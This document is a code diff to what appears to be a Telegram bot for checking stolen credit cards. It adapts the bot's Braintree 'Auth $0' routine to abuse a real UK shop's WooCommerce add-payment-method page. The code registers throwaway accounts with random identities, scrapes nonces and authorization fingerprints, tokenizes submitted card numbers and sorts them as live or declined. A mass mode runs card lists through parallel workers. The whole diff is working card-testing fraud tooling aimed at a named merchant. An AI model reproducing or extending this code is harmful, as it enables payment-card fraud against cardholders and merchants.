@@ -182,7 +182,8 @@ sc_form_hash = None
 sc_http_session = None
 b3_mass_running = False
 b3_auth_fp = None
-b3_checkout_nonce = None
+b3_apm_nonce = None
+b3_config_data = None
 b3_http_session = None
 
 # ============================================
@@ -1060,9 +1061,8 @@ def clear_sc_hits():
 # ============================================
 
 B3_SITE_URL = "https://trade-chem.co.uk"
-B3_PRODUCT_URL = f"{B3_SITE_URL}/product/24mm-white-heavy-mill-boston-cap-x-25/"
-B3_PRODUCT_ID = "1879"
-B3_CHECKOUT_URL = f"{B3_SITE_URL}/checkout/"
+B3_ADD_PM_URL = f"{B3_SITE_URL}/my-account/add-payment-method/"
+B3_MY_ACCOUNT_URL = f"{B3_SITE_URL}/my-account/"
 B3_MERCHANT_ID = "zkrjk5krj2dwnsgc"
 B3_MERCHANT_ACCOUNT = "stuarttradechemcouk"
 B3_GRAPHQL_URL = "https://payments.braintree-api.com/graphql"
@@ -1090,6 +1090,36 @@ def b3_random_identity():
     domain = random.choice(["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"])
     return first, last, f"{user}@{domain}", random.choice(B3_ADDRESSES)
 
+def b3_load_cookies(session):
+    cookies_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'cookies.json')
+    if os.path.exists(cookies_path):
+        with open(cookies_path) as f:
+            cookies = json.load(f)
+        for c in cookies:
+            domain = c.get('domain', '')
+            if 'trade-chem' in domain:
+                session.cookies.set(c['name'], c['value'], domain=domain, path=c.get('path', '/'))
+        return True
+    return False
+
+def b3_try_register(session):
+    try:
+        r = session.get(B3_MY_ACCOUNT_URL, verify=False, timeout=30)
+        reg_nonce = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', r.text)
+        if not reg_nonce:
+            return False
+        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+        email = f'{user}@protonmail.com'
+        password = 'Chk' + ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + '!'
+        resp = session.post(B3_MY_ACCOUNT_URL, data={
+            'email': email, 'password': password,
+            'woocommerce-register-nonce': reg_nonce.group(1),
+            '_wp_http_referer': '/my-account/', 'register': 'Register',
+        }, verify=False, timeout=30, allow_redirects=True)
+        return 'Log out' in resp.text or 'log-out' in resp.text
+    except:
+        return False
+
 def b3_get_session_and_auth(session=None):
     if session is None:
         session = requests.Session()
@@ -1098,27 +1128,26 @@ def b3_get_session_and_auth(session=None):
                           '(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
         })
     try:
-        session.get(B3_PRODUCT_URL, verify=False, timeout=30)
-        session.post(B3_PRODUCT_URL,
-                     data={'quantity': '1', 'add-to-cart': B3_PRODUCT_ID},
-                     verify=False, timeout=30, allow_redirects=True)
-        r = session.get(B3_CHECKOUT_URL, verify=False, timeout=30)
+        has_cookies = b3_load_cookies(session)
+        if not has_cookies:
+            b3_try_register(session)
+        r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
+        if 'Credit Cards' not in r.text and 'add_payment_method' not in r.text:
+            b3_try_register(session)
+            r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
         cm_match = re.search(r'wc_braintree_client_manager_params\s*=\s*(\{[^;]+)', r.text)
         if not cm_match:
-            return session, None, None
+            return session, None, None, None
         cm = json.loads(cm_match.group(1).rstrip(';'))
         wpnonce = cm.get('_wpnonce', '')
-        checkout_nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', r.text)
-        checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else ''
-        if not checkout_nonce:
-            checkout_nonce_match = re.search(r'id="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', r.text)
-            checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else ''
+        apm_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', r.text)
+        apm_nonce = apm_nonce_match.group(1) if apm_nonce_match else ''
         token_url = (f'{B3_SITE_URL}/?wc-ajax=wc_braintree_frontend_request'
                      f'&path=/wc-braintree/v1/client-token/create')
         r2 = session.post(token_url, verify=False, timeout=30,
                           headers={
                               'X-Requested-With': 'XMLHttpRequest',
-                              'Referer': f'{B3_SITE_URL}/checkout/'
+                              'Referer': B3_ADD_PM_URL
                           },
                           data={
                               'currency': 'GBP',
@@ -1126,35 +1155,35 @@ def b3_get_session_and_auth(session=None):
                               '_wpnonce': wpnonce
                           })
         if r2.status_code != 200:
-            return session, None, None
+            return session, None, None, None
         client_token_b64 = r2.text.strip('"')
         decoded = json.loads(base64.b64decode(client_token_b64))
         auth_fp = decoded.get('authorizationFingerprint', '')
         if not auth_fp:
-            return session, None, None
-        return session, auth_fp, checkout_nonce
+            return session, None, None, None
+        return session, auth_fp, apm_nonce, decoded
     except:
-        return session, None, None
+        return session, None, None, None
 
 def b3_refresh_auth(session):
     try:
-        r = session.get(B3_CHECKOUT_URL, verify=False, timeout=30)
+        r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
+        if 'Credit Cards' not in r.text and 'add_payment_method' not in r.text:
+            b3_try_register(session)
+            r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
         cm_match = re.search(r'wc_braintree_client_manager_params\s*=\s*(\{[^;]+)', r.text)
         if not cm_match:
-            return None, None
+            return None, None, None
         cm = json.loads(cm_match.group(1).rstrip(';'))
         wpnonce = cm.get('_wpnonce', '')
-        checkout_nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', r.text)
-        checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else ''
-        if not checkout_nonce:
-            checkout_nonce_match = re.search(r'id="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', r.text)
-            checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else ''
+        apm_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', r.text)
+        apm_nonce = apm_nonce_match.group(1) if apm_nonce_match else ''
         token_url = (f'{B3_SITE_URL}/?wc-ajax=wc_braintree_frontend_request'
                      f'&path=/wc-braintree/v1/client-token/create')
         r2 = session.post(token_url, verify=False, timeout=30,
                           headers={
                               'X-Requested-With': 'XMLHttpRequest',
-                              'Referer': f'{B3_SITE_URL}/checkout/'
+                              'Referer': B3_ADD_PM_URL
                           },
                           data={
                               'currency': 'GBP',
@@ -1162,12 +1191,12 @@ def b3_refresh_auth(session):
                               '_wpnonce': wpnonce
                           })
         if r2.status_code != 200:
-            return None, None
+            return None, None, None
         client_token_b64 = r2.text.strip('"')
         decoded = json.loads(base64.b64decode(client_token_b64))
-        return decoded.get('authorizationFingerprint', None), checkout_nonce
+        return decoded.get('authorizationFingerprint', None), apm_nonce, decoded
     except:
-        return None, None
+        return None, None, None
 
 def b3_tokenize_card(session, auth_fp, cc, mm, yy, cvv, addr):
     graphql_body = {
@@ -1341,66 +1370,41 @@ def b3_classify_3ds(status_code, resp):
         return "DECLINED", f"Unknown status: {status}", nonce
     return "DECLINED", f"Unknown: {status}", ""
 
-def b3_submit_checkout(session, nonce, first, last, email, addr, checkout_nonce):
-    checkout_url = f"{B3_SITE_URL}/?wc-ajax=checkout"
-    card_type = "visa"
-    data = {
-        'billing_first_name': first,
-        'billing_last_name': last,
-        'billing_company': '',
-        'billing_country': addr.get('country', 'GB'),
-        'billing_address_1': addr.get('line1', '10 DOWNING ST'),
-        'billing_address_2': '',
-        'billing_city': addr.get('city', 'LONDON'),
-        'billing_state': addr.get('state', ''),
-        'billing_postcode': addr.get('zip', 'SW1A 1AA'),
-        'billing_phone': f"+1{random.randint(2000000000, 9999999999)}",
-        'billing_email': email,
-        'order_comments': '',
-        'payment_method': 'braintree_credit_card',
-        'wc-braintree-credit-card-card-type': card_type,
-        'wc-braintree-credit-card-3d-secure-enabled': 'true',
-        'wc-braintree-credit-card-3d-secure-nonce': nonce,
-        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-        'woocommerce-process-checkout-nonce': checkout_nonce,
-        '_wp_http_referer': '/checkout/',
-    }
-    headers = {
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'X-Requested-With': 'XMLHttpRequest',
-        'Referer': f'{B3_SITE_URL}/checkout/',
-        'Origin': B3_SITE_URL,
-    }
+def b3_submit_add_payment_method(session, nonce, apm_nonce, config_data):
+    device_data = json.dumps({"correlation_id": str(uuid.uuid4())[:36]})
     try:
-        resp = session.post(checkout_url, data=data, headers=headers,
-                            verify=False, timeout=45)
+        resp = session.post(B3_ADD_PM_URL, data={
+            'payment_method': 'braintree_cc',
+            'braintree_cc_nonce_key': nonce,
+            'braintree_cc_device_data': device_data,
+            'braintree_cc_3ds_nonce_key': nonce,
+            'braintree_cc_config_data': json.dumps(config_data) if config_data else '',
+            'woocommerce-add-payment-method-nonce': apm_nonce,
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'woocommerce_add_payment_method': '1',
+        }, verify=False, timeout=45, allow_redirects=True)
         return resp.status_code, resp.text
     except Exception as e:
         return 0, str(e)
 
-def b3_classify_checkout_response(status_code, resp_text):
+def b3_classify_apm_response(status_code, resp_text):
     if status_code == 0:
         return "ERROR", resp_text[:80]
-    try:
-        resp_json = json.loads(resp_text)
-    except:
-        error_match = re.search(r'<li[^>]*>([^<]+)</li>', resp_text)
-        if error_match:
-            return b3_classify_server_msg(error_match.group(1).strip())
-        return "ERROR", f"Non-JSON response (HTTP {status_code})"
-    result = resp_json.get('result', '')
-    if result == 'success':
-        return "LIVE", "Payment approved"
-    messages = resp_json.get('messages', '')
-    error_msgs = re.findall(r'<li[^>]*>([^<]+)</li>', messages)
-    if error_msgs:
-        server_msg = error_msgs[0].strip()
+    error_match = re.search(r'There was an error saving your payment method[.\s]*Reason:\s*([^<]+)', resp_text)
+    if error_match:
+        server_msg = error_match.group(1).strip()
         return b3_classify_server_msg(server_msg)
-    if messages:
-        clean = re.sub(r'<[^>]+>', '', messages).strip()
+    if 'Payment method successfully added' in resp_text:
+        return "LIVE", "Payment method successfully added"
+    notices = re.findall(r'class="woocommerce-(?:error|message)[^"]*"[^>]*>(.*?)</(?:ul|div)', resp_text, re.DOTALL)
+    for n in notices:
+        clean = re.sub(r'<[^>]+>', ' ', n).strip()
         if clean:
             return b3_classify_server_msg(clean)
-    return "DECLINED", f"Checkout failed: {result}"
+    error_li = re.search(r'<li[^>]*>([^<]+)</li>', resp_text)
+    if error_li:
+        return b3_classify_server_msg(error_li.group(1).strip())
+    return "DECLINED", "No response captured"
 
 def b3_classify_server_msg(msg):
     ml = msg.lower()
@@ -1430,7 +1434,7 @@ def b3_classify_server_msg(msg):
         return "3DS", msg
     return "DECLINED", msg
 
-def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None, checkout_nonce=None):
+def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None, apm_nonce=None, config_data=None):
     global b3_auth_fp, b3_http_session
     start_time = time.time()
     if len(year) == 2:
@@ -1441,17 +1445,17 @@ def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None, check
     
     try:
         if session is None or auth_fp is None:
-            session, auth_fp, checkout_nonce = b3_get_session_and_auth(session)
+            session, auth_fp, apm_nonce, config_data = b3_get_session_and_auth(session)
             if not auth_fp:
                 elapsed = round(time.time() - start_time, 2)
-                return "ERROR", "Failed to get auth fingerprint", "Failed to get auth fingerprint", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, checkout_nonce
+                return "ERROR", "Failed to get auth fingerprint", "Failed to get auth fingerprint", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
         
         tok_status, tok_resp = b3_tokenize_card(session, auth_fp, cc, month, year, cvv, addr)
         result, msg = b3_classify_tokenize(tok_status, tok_resp)
         
         if result != "TOKEN":
             elapsed = round(time.time() - start_time, 2)
-            return result, msg, msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, checkout_nonce
+            return result, msg, msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
         
         token = msg
         
@@ -1461,24 +1465,24 @@ def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None, check
         
         if not nonce or tds_result in ("ERROR",):
             elapsed = round(time.time() - start_time, 2)
-            return tds_result, tds_msg, tds_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, checkout_nonce
+            return tds_result, tds_msg, tds_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
         
-        if not checkout_nonce:
+        if not apm_nonce:
             elapsed = round(time.time() - start_time, 2)
-            return tds_result, tds_msg, tds_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, checkout_nonce
+            return tds_result, tds_msg, tds_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
         
-        chk_status, chk_text = b3_submit_checkout(session, nonce, first, last, email, addr, checkout_nonce)
-        result, server_msg = b3_classify_checkout_response(chk_status, chk_text)
+        chk_status, chk_text = b3_submit_add_payment_method(session, nonce, apm_nonce, config_data)
+        result, server_msg = b3_classify_apm_response(chk_status, chk_text)
         
         elapsed = round(time.time() - start_time, 2)
-        return result, server_msg, server_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, checkout_nonce
+        return result, server_msg, server_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
         
     except requests.exceptions.Timeout:
         elapsed = round(time.time() - start_time, 2)
-        return "ERROR", "Timeout", "Request timed out", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, checkout_nonce
+        return "ERROR", "Timeout", "Request timed out", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
     except Exception as e:
         elapsed = round(time.time() - start_time, 2)
-        return "ERROR", str(e)[:80], str(e)[:80], "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, checkout_nonce
+        return "ERROR", str(e)[:80], str(e)[:80], "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
 
 # ============================================
 # BRAINTREE AUTH CARD MANAGEMENT
@@ -3071,7 +3075,7 @@ def sc_command(message):
 
 @bot.message_handler(commands=['b3'])
 def b3_command(message):
-    global b3_http_session, b3_auth_fp, b3_checkout_nonce
+    global b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data
     args = message.text.split()
     if len(args) < 2:
         bot.reply_to(message, "❌ Format: /b3 cc|mm|yy|cvv")
@@ -3091,8 +3095,8 @@ def b3_command(message):
     processing_msg = bot.reply_to(message, "💳 *Checking with Braintree Auth $0 Gateway...*\n⏳ Please wait...", parse_mode='Markdown')
     
     bin_info = bin_lookup(cc[:6])
-    result = check_braintree_auth(cc, month, year, cvv, session=b3_http_session, auth_fp=b3_auth_fp, checkout_nonce=b3_checkout_nonce)
-    category, status_msg, response_msg, price, gateway, elapsed, b3_http_session, b3_auth_fp, b3_checkout_nonce = result
+    result = check_braintree_auth(cc, month, year, cvv, session=b3_http_session, auth_fp=b3_auth_fp, apm_nonce=b3_apm_nonce, config_data=b3_config_data)
+    category, status_msg, response_msg, price, gateway, elapsed, b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data = result
     card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
     response = format_b3_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
     
@@ -3484,7 +3488,7 @@ def b3_mass_command(message):
             stop_mass_flag = False
     
     def _run_b3_mass_inner(chat_id, msg_id):
-        global b3_mass_running, stop_mass_flag, b3_http_session, b3_auth_fp, b3_checkout_nonce
+        global b3_mass_running, stop_mass_flag, b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data
         
         stats = {
             'live': 0, 'threeds': 0, 'cvv': 0,
@@ -3506,7 +3510,7 @@ def b3_mass_command(message):
             task_queue.put(None)
         
         def b3_worker(worker_id):
-            global b3_http_session, b3_auth_fp, b3_checkout_nonce
+            global b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data
             while not stop_mass_flag:
                 if mass_paused:
                     time.sleep(1)
@@ -3523,8 +3527,8 @@ def b3_mass_command(message):
                     
                     cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                     bin_info = bin_lookup(cc[:6])
-                    result = check_braintree_auth(cc, month, year, cvv, session=b3_http_session, auth_fp=b3_auth_fp, checkout_nonce=b3_checkout_nonce)
-                    category, status_msg, response_msg, price, gateway, elapsed, b3_http_session, b3_auth_fp, b3_checkout_nonce = result
+                    result = check_braintree_auth(cc, month, year, cvv, session=b3_http_session, auth_fp=b3_auth_fp, apm_nonce=b3_apm_nonce, config_data=b3_config_data)
+                    category, status_msg, response_msg, price, gateway, elapsed, b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data = result
                     result_queue.put(('success', card_str, (category, status_msg, response_msg, price, gateway, elapsed), worker_id, cc, month, year, cvv, bin_info))
                 except:
                     continue
